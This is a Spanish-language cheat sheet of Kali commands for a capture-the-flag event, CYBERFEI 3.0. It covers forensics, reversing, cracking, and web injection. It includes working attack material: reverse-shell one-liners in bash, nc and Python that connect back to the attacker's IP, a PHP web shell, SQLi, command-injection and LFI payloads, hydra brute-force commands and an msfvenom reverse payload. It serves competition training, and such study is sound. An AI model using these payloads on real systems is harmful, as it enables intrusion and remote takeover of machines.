# Comandos para CTF (Kali) — explicados

Cada bloque trae: **el comando**, qué significa cada parte y para qué sirve.
Convención: lo que va en MAYÚSCULAS lo cambias tú (OBJETIVO, PUERTO, ARCHIVO).

---

## ⚠️ Reglas del evento (CYBERFEI 3.0 · 21 oct · Salón Cristal · 3.5 h)
Estas reglas mandan sobre todo lo demás:
1. **Sin internet.** Descarga HOY herramientas, wordlists y docs. Mañana no se instala nada.
2. **El writeup vale más que la bandera:** Bandera **30** · Writeup **40** · Estilo **40**.
3. **Origen del código:** script **propio = 100%** de estilo · snippet de terceros = 50% · **sospecha de IA = descalificación.**
4. **Formato de bandera:** `flag{...}` o `CyberFEI{...}`. Búscala siempre con `grep`/`strings`.
5. **Zona gris (pregunta a los organizadores antes de usar):** `sqlmap`, `wpscan`, `nikto`/`nuclei`, RsaCtfTool y cualquier ataque automatizado. Si dudas, **hazlo manual y documéntalo** → eso te da el 100% de estilo.

> Por la regla 3: escribe TÚ los comandos. Los `.py` del kit (`decode.py`, `rsa_tool.py`, `pwn_template.py`) son solo para **estudiar en casa**, NO para el evento.

---

## 0. Lo que haces con CUALQUIER archivo que te den

```bash
file ARCHIVO
```
- `file` mira los primeros bytes (magic bytes) y te dice **qué es de verdad**, sin fiarse de la extensión. Un ".jpg" puede ser un ZIP.

```bash
strings -n 6 ARCHIVO | less
```
- `strings` saca las secuencias de texto legible dentro de un binario.
- `-n 6` = solo cadenas de 6 caracteres o más (quita ruido).
- `| less` = lo paginas para leerlo. Sirve para **ver la flag en claro, rutas, contraseñas**.

```bash
strings -n 6 ARCHIVO | grep -iE 'flag|ctf|\{.*\}'
```
- `| grep` filtra la salida anterior.
- `-i` = ignora mayúsculas/minúsculas. `-E` = regex extendida.
- `'flag|ctf|\{.*\}'` = líneas con "flag", "ctf" o algo entre llaves. **Encuentra la bandera directo.**

```bash
xxd ARCHIVO | head
```
- `xxd` = volcado hexadecimal + ASCII al lado. `| head` = primeras líneas.
- Sirve para ver los **magic bytes** y arreglar archivos corruptos.

```bash
exiftool ARCHIVO
```
- Lee **metadatos**: autor, fecha, GPS, comentarios. En imágenes muchas veces la flag va en un campo "Comment".

```bash
binwalk ARCHIVO
```
- Busca **archivos escondidos dentro de otro** (un ZIP metido en un PNG, etc.).
```bash
binwalk -e ARCHIVO
```
- `-e` = extrae lo que encontró. Los saca a una carpeta `_ARCHIVO.extracted`.

---

## 1. Cómo se estructura un comando (para que lo entiendas, no lo memorices)

```
programa   -opciones   argumento
nmap       -sV -p-     10.10.10.5
└ qué uso  └ cómo      └ sobre qué
```
- Las **opciones cortas** van con un guion: `-p`. Las **largas** con dos: `--script`.
- Puedes **encadenar** salidas con `|` (tubería): la salida de la izquierda entra a la derecha.
- Puedes **guardar** la salida con `>`: `nmap ... > resultado.txt`.
- `comando --help` o `man comando` te dan todas las opciones.

---

## 2. Reconocimiento de red / servicios

```bash
nmap -sC -sV -p- OBJETIVO
```
- `nmap` = escáner de puertos.
- `-p-` = escanea los 65535 puertos (no solo los comunes).
- `-sV` = detecta la **versión** del servicio de cada puerto.
- `-sC` = corre los scripts básicos de reconocimiento.
- Para qué: saber **qué está corriendo** y por dónde atacar.

```bash
nc OBJETIVO PUERTO
```
- `nc` (netcat) = te conectas "a pelo" a un puerto. Muchos retos de misc/pwn te dan `host puerto` y hablas con el servicio aquí.

---

## 3. Web

```bash
curl -s http://OBJETIVO
```
- `curl` = pide una URL desde la terminal. `-s` = silencioso (sin barra de progreso).
```bash
curl -sI http://OBJETIVO
```
- `-I` = solo las **cabeceras** (headers). Ves servidor, cookies, redirecciones.
```bash
curl -s http://OBJETIVO/robots.txt
```
- Archivos que suelen revelar rutas ocultas: `robots.txt`, `sitemap.xml`, `/.git/`.

```bash
gobuster dir -u http://OBJETIVO -w /usr/share/wordlists/dirb/common.txt
```
- `gobuster dir` = busca **rutas/carpetas ocultas** probando palabras de una lista.
- `-u` = la URL. `-w` = el diccionario (wordlist) de nombres a probar.
- Para qué: encontrar `/admin`, `/backup`, `/flag.txt`, etc.

```bash
ffuf -u http://OBJETIVO/FUZZ -w LISTA.txt
```
- `ffuf` = fuzzer rápido. Donde pongas `FUZZ`, va probando cada palabra de la lista.
- Sirve igual que gobuster y también para parámetros o subdominios (mueves el `FUZZ`).

```bash
sqlmap -u "http://OBJETIVO/item?id=1" --batch --dbs
```
- `sqlmap` = automatiza **inyección SQL** (solo contra el reto autorizado).
- `-u` = la URL con el parámetro. `--batch` = responde solo a las preguntas.
- `--dbs` = lista las bases de datos. Luego `-D nombre --tables`, `--dump`, etc.

---

## 4. Contraseñas y hashes

```bash
hashid 'EL_HASH'
```
- Te dice **qué tipo de hash** es (MD5, SHA1, bcrypt...). Así eliges el modo correcto.

```bash
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```
- `hashcat` = rompe hashes probando palabras.
- `-a 0` = modo diccionario. `-m 0` = tipo de hash (0 = MD5; 100 = SHA1; 1800 = sha512crypt).
- El último argumento es el diccionario. Saca la contraseña si está en la lista.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
- `john` (John the Ripper) = lo mismo, suele detectar el tipo solo.

```bash
zip2john archivo.zip > h.txt && john --wordlist=rockyou.txt h.txt
```
- `zip2john` convierte un ZIP con contraseña a un formato que John entiende.
- `&&` = corre el segundo comando solo si el primero salió bien.

---

## 5. Esteganografía (datos escondidos en imágenes/audio)

```bash
steghide extract -sf imagen.jpg
```
- `steghide extract` = saca datos ocultos de un JPG. `-sf` = archivo de origen.
- Te pide contraseña: prueba vacía (Enter) o palabras del reto.

```bash
zsteg imagen.png
```
- Revisa los **bits menos significativos** de un PNG/BMP (truco de stego clásico).

```bash
steghide info imagen.jpg
```
- Dice si el archivo **tiene algo embebido** antes de extraer.

Para audio: ábrelo en **Audacity** y mira el **espectrograma** (la flag se "dibuja").

---

## 6. Capturas de red (.pcap)

```bash
tshark -r captura.pcap | head
```
- `tshark` = Wireshark en consola. `-r` = lee un archivo. Ves los paquetes.

```bash
tshark -r captura.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
```
- `-Y "..."` = filtro (aquí, solo peticiones HTTP).
- `-T fields -e campo` = muestra solo esos campos. Útil para ver qué URLs se pidieron.

En **Wireshark** (gráfico): clic derecho en un paquete → **Follow > TCP Stream** para leer toda la conversación; `File > Export Objects > HTTP` para sacar archivos transferidos.

---

## 7. Reversing (entender un binario)

```bash
checksec --file=BINARIO
```
- Muestra las **protecciones** (NX, PIE, canary). Define cómo lo vas a atacar.

```bash
ltrace ./BINARIO
```
- Muestra las **llamadas a librería** mientras corre. Un `strcmp(tuEntrada, "clave")` te revela la contraseña.

```bash
./BINARIO; echo $?
```
- Lo corres y `echo $?` imprime el código de salida (0 = ok). Para ver cómo reacciona.

Para leer el código: abre el binario en **Ghidra** (`ghidra`), impórtalo, doble clic en `main` → te da pseudo-C.

---

## 8. Decodificar texto raro (base64, hex, rot...)

```bash
echo "dGV4dG8=" | base64 -d
```
- `base64 -d` = decodifica. (Sin `-d` codifica.) El `=` al final delata base64.

```bash
echo "74657874" | xxd -r -p
```
- `xxd -r -p` = convierte **hex a texto** (`-r` revierte, `-p` formato plano).

```bash
echo "GUVKByB" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```
- `tr` = sustituye caracteres. Esto es **ROT13** (corre el alfabeto 13 lugares).

```bash
echo -n "texto" | base64          # codificar
echo -n "texto" | md5sum          # sacar su MD5
```
- `-n` = sin salto de línea al final (importante, cambia el hash).

Para algo visual y sin instalar nada raro: clona **CyberChef** antes del evento y abre su HTML en el navegador (funciona offline).

---

## 9. Buscar la flag en todo un directorio

```bash
grep -raoiE '[A-Za-z0-9_]+\{[^}]+\}' .
```
- `grep` busca texto. `-r` = recursivo (entra a subcarpetas). `-a` = trata binarios como texto.
- `-o` = muestra solo lo que coincide. `-i` = ignora mayúsculas. `-E` = regex.
- `'[A-Za-z0-9_]+\{[^}]+\}'` = el patrón típico de bandera `palabra{...}`.
- `.` = la carpeta actual. **Barre todo buscando la flag de un golpe.**

---

## Reglas del día
- Ataca **solo** la infraestructura del reto, nunca la plataforma del evento ni a otros (salvo Attack-Defense).
- Confirma el **formato de la flag** (`flag{...}` o `CyberFEI{...}`) y úsalo en tus `grep`.
- Regla de los 20 min: atorado 20 min → pide ayuda o cambia de reto.
- Baja fruta primero: ordena por puntaje, empieza por lo fácil.
- Último 30 min: congela exploración y **pule writeups**.
- Anota cada comando que te sirvió: es tu write-up y tu chuleta para la próxima.

---
---

# PARTE 2 — Aportes de la guía de tu compañero (CYBERFEI 3.0)

Lo que sigue complementa lo de arriba. Mismo criterio: puro comando explicado.

## 10. Triage — el reflejo universal (corre esto SIEMPRE primero)
```bash
strings -n 6 ARCHIVO | grep -iE 'flag|cyberfei|ctf'
```
- Muchísimas banderas "difíciles" estaban en texto plano todo el tiempo. Antes de abrir herramientas pesadas, corre esto.

| Te dan… | Primer reflejo |
|---|---|
| Archivo cualquiera | `file` → `strings -n6` → `exiftool` → `binwalk` |
| Imagen | estego: `zsteg`/`steghide` + Stegsolve (+ espectro si es audio) |
| Texto raro | CyberChef "Magic"; ¿base64/hex/rot? |
| `.pcap` | Wireshark → Follow Stream → Export Objects |
| URL/puerto | `nmap`, DevTools, ver fuente, `robots.txt` |
| Binario ELF | `file`, `strings`, `checksec`, Ghidra |
| Dump de RAM | Volatility 3: `windows.info` |

## 11. Guardar evidencia (clave para el writeup = 40 pts)
```bash
script -t sesion.log
```
- `script` **graba toda la terminal** (comandos y salidas) a un archivo. Ctrl-D para cerrar. Actívalo al empezar cada reto y ya no reconstruyes nada.
```bash
history > comandos.txt
```
- Vuelca los comandos que usaste.
```bash
flameshot gui
```
- Captura de pantalla rápida (para pegar el momento en que sale la flag).

## 12. Tráfico — tcpdump y tshark (además de Wireshark)
```bash
tcpdump -r cap.pcap -nn
```
- `-r` lee un archivo. `-nn` = no resolver nombres/puertos (más rápido y claro).
```bash
tcpdump -r cap.pcap -A | grep -i flag
```
- `-A` = muestra el payload en **ASCII**. Lo filtras por "flag".
```bash
tcpdump -r cap.pcap 'port 21'
```
- Filtro **BPF** de captura (`host`, `port`, `tcp`, `and`/`or`). Ojo: los filtros BPF **no** son los de display de Wireshark.
```bash
tshark -r cap.pcap --export-objects http,./out
```
- Extrae todos los archivos HTTP transferidos a la carpeta `./out`.
```bash
tshark -r cap.pcap -T fields -e data | xxd -r -p | strings | grep -i flag
```
- Saca el campo `data` crudo → lo pasa de hex a bytes → texto → busca la flag.

**Qué buscar en un pcap:** credenciales en claro (FTP/Telnet/HTTP Basic), **DNS exfil** (subdominios larguísimos = datos en base32/hex), **ICMP** con payload raro, **USB-HID** (teclas que hay que decodificar), y si dan keylog TLS: Wireshark → Preferences → TLS → (Pre)-Master-Secret.

## 13. Reversing — gdb y radare2 (entrar al binario)
```bash
checksec --file=BINARIO
```
- Protecciones (NX, PIE, canary): definen cómo lo atacas.
```bash
ltrace ./BINARIO
```
- Llamadas a librería; un `strcmp(tuInput,"clave")` te revela la contraseña.
```bash
gdb ./BINARIO
```
Dentro de gdb:
- `break main` = pausa al entrar a main. `run` = ejecuta. `info functions` = lista funciones.
- `x/20i $pc` = muestra 20 instrucciones desde donde está parado. `c` = continuar.
```bash
r2 -A BINARIO
```
- `radare2` con análisis. Dentro: `aaa` (analiza), `afl` (lista funciones), `pdf @ main` (desensambla main), `iz` (strings).
- Para leer pseudo-C cómodo: **Ghidra** → importar → analizar todo → doble clic en `main`.

## 14. Forense de memoria — Volatility 3
```bash
vol -f dump.mem windows.info
```
- `-f` = el volcado de RAM. `windows.info` = perfil/SO. **Siempre el primero.**
```bash
vol -f dump.mem windows.pslist      # procesos
vol -f dump.mem windows.pstree      # árbol de procesos
vol -f dump.mem windows.cmdline     # líneas de comando tecleadas
vol -f dump.mem windows.filescan | grep -i flag
vol -f dump.mem windows.hashdump    # hashes de usuarios
vol -f dump.mem windows.netscan     # conexiones de red
```
- Para Linux usa los plugins `linux.*` (bash history, pslist). Busca procesos raros y el historial.

## 15. Forense de disco — Sleuth Kit y carving
```bash
mmls disco.img
```
- Tabla de particiones (te da el **OFFSET** que usas abajo).
```bash
fls -r -o OFFSET disco.img
```
- Lista archivos, **incluidos borrados** (`-r` recursivo, `-o` el offset de la partición).
```bash
icat -o OFFSET disco.img INODO > recuperado
```
- Recupera un archivo por su número de inodo.
```bash
foremost -i disco.img -o salida/
```
- **File carving**: recupera archivos por su firma, aunque no haya tabla.
```bash
binwalk --dd='.*' ARCHIVO
```
- Extrae todo lo que binwalk reconozca por firma.

## 16. Blue Team — análisis de logs (grep + razonar)
```bash
grep -i "flag" *.log
```
```bash
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head
```
- `awk '{print $1}'` saca la **primera columna** (IP) de cada línea. `sort | uniq -c` cuenta repetidas. `sort -rn | head` = las más frecuentes → posible atacante.
```bash
grep "Failed password" auth.log | awk '{print $11}' | sort | uniq -c
```
- Cuenta intentos fallidos por origen → fuerza bruta.
```bash
cat eventos.json | jq '.[] | select(.event=="login")'
```
- `jq` filtra JSON. Aquí, solo los eventos de login.

**Patrones:** fuerza bruta (muchos fallos y luego un éxito desde la misma IP), web attack (`../`, `UNION`, `<script>` en `access.log`), exfil (respuestas enormes, user-agents raros), persistencia (usuarios/cron nuevos).

## 17. Web — lo que faltaba (inyección MANUAL = 100% estilo)
### Command injection (cuando un campo ejecuta comandos del sistema)
```
127.0.0.1; ls
127.0.0.1 && cat flag.txt
`id`    $(id)    | whoami
```
- `;` encadena, `&&` corre si lo anterior salió bien, `` `id` `` y `$(id)` ejecutan y sustituyen, `|` encadena salida.

### SSTI — inyección de plantillas
```
{{7*7}}     ${7*7}     #{7*7}
```
- Si la página te devuelve `49`, es inyectable (está evaluando tu expresión).

### SQL injection manual (detectar)
```
' OR '1'='1
admin'--
' ORDER BY 3--              (descubre nº de columnas)
' UNION SELECT 1,2,3--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
```
- Hazlo **a mano** y documéntalo: `sqlmap` lo automatiza pero es **zona gris** (regla 5).

### LFI / leer el fuente PHP
```
?file=../../../../etc/passwd
?file=php://filter/convert.base64-encode/resource=index.php
```
- El wrapper `php://filter` te entrega el PHP en base64 (ahí suele estar la flag).

### JWT (tokens `eyJ...`)
```bash
echo 'PARTE_DEL_MEDIO' | base64 -d 2>/dev/null
```
- Decodifica el payload. Debilidades: `alg:none`, o firma HS256 con secreto débil → `hashcat -m 16500`.

### Cookies
- `role=user` → cámbialo a `admin`; `auth=0` → `1`; si está en base64, decodifica, edita y recodifica.

### GTFOBins
- Descárgalo hoy: catálogo de **cómo abusar de binarios SUID/permitidos** para leer archivos o escalar.

## 18. Cripto/estego — lo que faltaba
### hashcat por modo
```bash
hashcat -m 0 h.txt rockyou.txt      # 0=MD5 100=SHA1 1400=SHA256 1800=sha512crypt 3200=bcrypt 1000=NTLM 16500=JWT
hashcat -m 0 h.txt -a 3 '?d?d?d?d'  # -a 3 = máscara; ?d un dígito (prueba 0000-9999)
```
### john por formato
```bash
john --format=raw-md5 --wordlist=rockyou.txt h.txt && john --show h.txt
```
### Archivos protegidos → a formato de john
```bash
zip2john a.zip > h.txt   # también pdf2john, rar2john, ssh2john
```
### Estego en texto / contenedores
```bash
cat -A nota.txt | head
```
- `-A` hace visibles **tabs (`^I`) y fines de línea (`$`)** → delata estego de espacios/tabs. Para unicode zero-width, pásalo por CyberChef.
```bash
unzip -l doc.docx
```
- Un docx/xlsx **es un ZIP**: renómbralo y míralo por dentro.
### Estego en imagen/QR/audio
```bash
zbarimg qr.png            # lee un QR
pngcheck -v img.png       # PNG corrupto: a veces ocultan datos en alto/ancho
convert img.png -auto-level out.png   # sube contraste (ImageMagick) para imagen "plana"
zsteg -a img.png          # todas las capas LSB de un PNG/BMP
```
- Audio sin razón aparente → casi siempre **espectrograma** (ábrelo en Audacity/Sonic Visualiser, vista de espectro).

---

# PARTE 3 — Lo que pediste: wpscan, searchsploit e inyección

## wpscan — enumerar WordPress  ⚠️ ZONA GRIS (pregunta antes)
Es un escáner **automatizado**; por la regla 5 confirma con los organizadores. Necesita su base de datos descargada **hoy** (`wpscan --update` con internet).
```bash
wpscan --url http://OBJETIVO
```
- Enumera versión de WordPress, plugins y temas (donde suele estar la vulnerabilidad).
```bash
wpscan --url http://OBJETIVO --enumerate u
```
- `--enumerate u` = lista **usuarios** válidos.
```bash
wpscan --url http://OBJETIVO --enumerate vp,vt
```
- `vp` = plugins vulnerables, `vt` = temas vulnerables.
```bash
wpscan --url http://OBJETIVO -U usuarios.txt -P rockyou.txt
```
- `-U`/`-P` = fuerza bruta de login (usuarios/contraseñas). Solo si las reglas lo permiten.

**Equivalente manual (más seguro de estilo):** mira `/wp-login.php`, `/wp-json/wp/v2/users` (lista usuarios), y `readme.html` o el `<meta name="generator">` del fuente para la versión.

## searchsploit — buscar exploits SIN internet  ✅ (es local)
Es la base de datos **ExploitDB local**. Descárgala hoy (`sudo apt install exploitdb`). Solo busca y copia exploits, no ataca solo → no es zona gris.
```bash
searchsploit wordpress 5.8
```
- Busca exploits conocidos para ese software/versión (la que te dio `wpscan`/`nmap -sV`).
```bash
searchsploit -t apache
```
- `-t` = busca solo en el **título** (menos ruido).
```bash
searchsploit -x php/webapps/12345.txt
```
- `-x` = **abre** ese exploit para leerlo (la ruta sale en la búsqueda).
```bash
searchsploit -m php/webapps/12345.py
```
- `-m` = **copia** el exploit a tu carpeta actual para estudiarlo/adaptarlo.

> Flujo típico: `nmap -sV` o `wpscan` te dan servicio+versión → `searchsploit <servicio versión>` → lees el exploit → lo adaptas **tú** (regla 3: adaptarlo y entenderlo cuenta como trabajo propio; copiar y pegar a ciegas, no).

## Inyección — resumen (prioriza SIEMPRE lo manual)
Ya está arriba en la sección 17. En corto:

| Tipo | Prueba de detección | Manual (100% estilo) | Automático (zona gris) |
|---|---|---|---|
| **SQLi** | `' OR '1'='1`, `' ORDER BY N--` | `UNION SELECT ...` a mano | `sqlmap` |
| **Command inj.** | `; id`, `&& cat flag.txt`, `$(id)` | encadenar comandos | — |
| **SSTI** | `{{7*7}}` → ¿`49`? | leer config/RCE a mano | — |
| **LFI** | `?file=../../etc/passwd` | `php://filter` para el fuente | — |

Regla de oro del evento: detecta y explota **a mano**, pega el **request exacto + la respuesta con la bandera** en el writeup. Eso puntúa más que cualquier herramienta automática.

---

# PARTE 4 — Inyección de shell y feroxbuster

## 19. feroxbuster ("ferro") — descubrir rutas, pero RECURSIVO
Es un fuzzer de directorios/archivos como gobuster/ffuf, pero su gracia es que **baja solo** por las carpetas que va encontrando. Va en los paquetes de la guía de tu compañero. Para qué: encontrar `/admin`, `/backup`, `/uploads/secret/flag.txt`, etc.
```bash
feroxbuster -u http://OBJETIVO
```
- `-u` = la URL base. Sin más, ya fuzzea y entra recursivamente en lo que halla.
```bash
feroxbuster -u http://OBJETIVO -w /usr/share/wordlists/dirb/common.txt
```
- `-w` = el diccionario de nombres a probar.
```bash
feroxbuster -u http://OBJETIVO -x php,txt,bak -d 2
```
- `-x` = prueba además esas **extensiones** (`index.php`, `config.bak`…).
- `-d 2` = **profundidad** de recursión = 2 niveles (evita que se vaya eternamente).
```bash
feroxbuster -u http://OBJETIVO -C 404,403 -o ferox.txt
```
- `-C` = **oculta** esos códigos de estado (filtra el ruido del "404 bonito").
- `-o` = guarda la salida a archivo → evidencia para el writeup.

> Cuándo cada uno: `feroxbuster` si quieres recursión automática; `ffuf` para fuzzear parámetros/subdominios (mueves `FUZZ`); `gobuster` es el clásico simple. Los tres hacen lo mismo de base.

## 20. Inyección de shell — de "ejecuto comandos" a "tengo una consola"
Contexto: en un reto web con **command injection** (sección 17) o un servicio vulnerable, muchas veces no basta con `; cat flag.txt`: necesitas una **shell interactiva** en la máquina para moverte. Eso es "inyectar una shell". Solo contra la infraestructura del reto.

### Paso 1 — en TU máquina (Kali), ponte a escuchar
```bash
nc -lvnp 4444
```
- `nc` = netcat. `-l` = modo escucha (listener). `-v` = verboso. `-n` = sin DNS. `-p 4444` = puerto donde esperas la conexión.
- Aquí **llegará** la shell de la víctima. Déjalo abierto.

### Paso 2 — en la víctima (vía la inyección), lanza la reverse shell
Pones uno de estos como comando inyectado. `TU_IP` = la IP de tu Kali, `4444` = el puerto de arriba.
```bash
bash -i >& /dev/tcp/TU_IP/4444 0>&1
```
- Abre una bash interactiva (`-i`) y **redirige** su entrada/salida al socket TCP hacia tu máquina. La más usada en Linux.
```bash
nc TU_IP 4444 -e /bin/sh
```
- netcat conecta a tu listener y `-e` le entrega una `/bin/sh`. (No todos los `nc` traen `-e`.)
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("TU_IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'
```
- Si hay Python en la víctima: crea el socket, engancha stdin/stdout/stderr y lanza una shell. Útil cuando `nc` no tiene `-e`.

> **Reverse** (la víctima se conecta a ti) suele funcionar mejor que **bind** (tú te conectas a la víctima), porque los firewalls bloquean conexiones entrantes a la víctima pero no las salientes.

### Paso 3 — estabilizar la shell (que funcionen flechas, Ctrl-C, nano)
Una reverse shell cruda es incómoda. Para volverla usable:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # en la shell recibida
# luego pulsas: Ctrl-Z
stty raw -echo; fg                                # en TU Kali
export TERM=xterm                                 # de vuelta en la shell
```
- `pty.spawn` te da una pseudo-terminal real. El `stty raw -echo; fg` devuelve el control del teclado. Ya puedes usar `sudo`, editores, etc.

### Web shell (cuando puedes SUBIR un archivo)
Si el reto deja subir archivos y el servidor ejecuta PHP:
```php
<?php system($_GET['c']); ?>
```
- Lo guardas como `shell.php`, lo subes, y luego:
```bash
curl "http://OBJETIVO/uploads/shell.php?c=id"
curl "http://OBJETIVO/uploads/shell.php?c=cat%20/flag.txt"
```
- `?c=` = el comando a ejecutar (`%20` es un espacio en URL). Desde aquí puedes lanzar la reverse shell del Paso 2.

### Qué hacer ya con una shell dentro
```bash
id ; whoami ; hostname        # quién soy y dónde
find / -name 'flag*' 2>/dev/null   # buscar la bandera por todo el disco
cat /home/*/flag.txt /flag.txt 2>/dev/null
sudo -l                        # ¿qué puedo correr como root sin pass? (escalada)
```
- `find / -name 'flag*' 2>/dev/null` = busca archivos que empiecen con "flag" en todo el sistema; `2>/dev/null` esconde los errores de permisos.
- `sudo -l` + **GTFOBins** (lo descargaste) = ruta típica para escalar a root y leer la flag protegida.

> Para el writeup: documenta el **listener**, el **comando inyectado exacto**, y el `cat` que reveló la flag. Es una cadena muy vistosa para la rúbrica (reconocimiento → inyección → shell → flag).

### Usar un web shell que ya subiste (post-explotación)
Si subiste un `shell.php` que ejecuta `system($_GET['cmd'])`, le pasas comandos por la URL:
```bash
curl -G "http://IP/ruta/shell.php" --data-urlencode "cmd=id"
curl -G "http://IP/ruta/shell.php" --data-urlencode "cmd=find / -name 'flag*' 2>/dev/null"
```
- `-G` = manda GET con los datos en la URL (`?cmd=...`). `--data-urlencode` = codifica espacios/comillas para que el comando no se rompa.
- Desde aquí enumeras: `cat /etc/passwd`, consultar la BD con `mysql -u USER -p'PASS' -e 'show databases;'`, y finalmente lanzar la reverse shell del paso 2.
- **Interpretar:** la respuesta HTTP trae la salida del comando. Si sale vacío o un error PHP, prueba otro parámetro (`c`, `cmd`, `0`) o revisa que el archivo exista.

---

# PARTE 5 — Hydra y Metasploit (⚠️ ambos zona gris)

> Regla 5 del evento: son **automatizados**, pregunta a los organizadores antes de usarlos. Si puedes, haz el equivalente manual y documéntalo (100% de estilo).

## 21. hydra — fuerza bruta de login (en línea)
- **Por qué:** prueba miles de usuario/contraseña contra un servicio de login (SSH, FTP, HTTP...).
- **Cuándo:** tienes un login y sospechas credenciales débiles. Ojo: es ruidoso y automatizado (zona gris).
- **Cómo:** `hydra -l USUARIO -P LISTA.txt SERVICIO://OBJETIVO`
  - `-l` = un usuario fijo · `-L` = lista de usuarios · `-P` = lista de contraseñas · `-p` = una contraseña fija.
```bash
# SSH con un usuario conocido
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5

# FTP
hydra -l ftpuser -P rockyou.txt ftp://10.10.10.5

# login web por POST (el formato pide: ruta:campos:texto-de-fallo)
hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid"
```
- En el formulario web: `^USER^`/`^PASS^` es donde inyecta cada intento, y `Invalid` es el texto que aparece **cuando falla** (hydra lo usa para saber qué NO funcionó).
- **Interpretar:**
  - `[22][ssh] host: ... login: admin password: hunter2` → **credencial encontrada**.
  - Termina sin esa línea → no estaba en la lista.
  - `all children died` / errores de conexión → el servicio te está bloqueando o el puerto está mal.

## 22. msfconsole — Metasploit (framework de explotación)
- **Por qué:** tiene exploits y payloads listos para vulnerabilidades conocidas; automatiza la explotación.
- **Cuándo:** identificaste servicio+versión vulnerable (con `nmap -sV`/`searchsploit`) y hay módulo. Zona gris: confirma reglas; para estilo, prefiere el exploit manual.
- **Cómo (flujo dentro de la consola):**
```bash
msfconsole                      # abrir (tarda unos segundos)
```
```
search projectsend              # buscar módulo por software
use exploit/ruta/del/modulo     # seleccionarlo
info                            # leer qué hace y qué opciones pide
show options                    # ver parámetros obligatorios
set RHOSTS 10.10.10.5           # objetivo
set LHOST TU_IP                 # tu IP (para la reverse shell)
set LPORT 4444
check                           # (si el módulo lo soporta) ¿es vulnerable?
run                             # lanzar
```
- **Interpretar:**
  - `[+] ... The target is vulnerable` (de `check`) → adelante con `run`.
  - `Meterpreter session 1 opened` → **entraste**; escribe `shell` para una consola, o `getuid`, `sysinfo`.
  - `Exploit completed, but no session was created` → falló: revisa `LHOST`, el payload (`set payload ...`) o que de verdad sea vulnerable.
  - `search` sin resultados → no hay módulo; vuelve a `searchsploit` y hazlo manual.
- **Payload útil para generar un ejecutable/reverse (msfvenom):**
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f elf -o rev.elf
```
  - Lo subes a la víctima y lo ejecutas mientras escuchas con `nc -lvnp 4444`.
```
```
